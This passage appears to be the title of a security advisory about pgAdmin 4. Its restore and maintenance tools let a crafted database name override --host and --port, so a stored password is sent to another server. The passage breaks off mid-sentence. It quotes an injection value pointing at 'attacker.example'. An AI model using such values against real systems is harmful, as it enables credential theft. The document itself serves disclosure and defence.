title: "pgAdmin 4's Restore and Maintenance tools passed the client-supplied 'database'
  field directly as the value of the --dbname option given to pg_restore and psql.
  libpq expands a database name containing an equals sign into a full connection string,
  and connection keywords embedded in that value take precedence over the --host and
  --port arguments that pgAdmin supplies. A value such as 'host=attacker.example port=5432
  dbname=x' therefore redirected the utility to a server chosen by the requesting
  user rather than the server the operation was invoked against. Because pgAdmin exports
  the decrypted stored database password in the PGPASSWORD environment variable before
  executing the utility, the redirected connection presents that credential to the
  attacker-nominated endpoint, which may capture it. The redirection additionally
  permits outbound connections from the pgAdmin host to arbitrary network addresses,
